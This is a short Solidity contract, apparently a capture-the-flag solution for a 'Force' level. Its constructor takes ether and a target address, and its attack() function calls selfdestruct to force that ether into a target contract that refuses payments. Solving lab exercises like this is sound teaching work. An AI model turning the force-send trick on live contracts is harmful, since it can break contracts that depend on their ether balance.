// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./7-Force.sol";

contract ForceAttacker {
    address payable forceAddress;

    constructor(address payable _forceAddress) public payable {
        forceAddress = _forceAddress;
    }

    function attack() public {
        selfdestruct(forceAddress);
    }
}
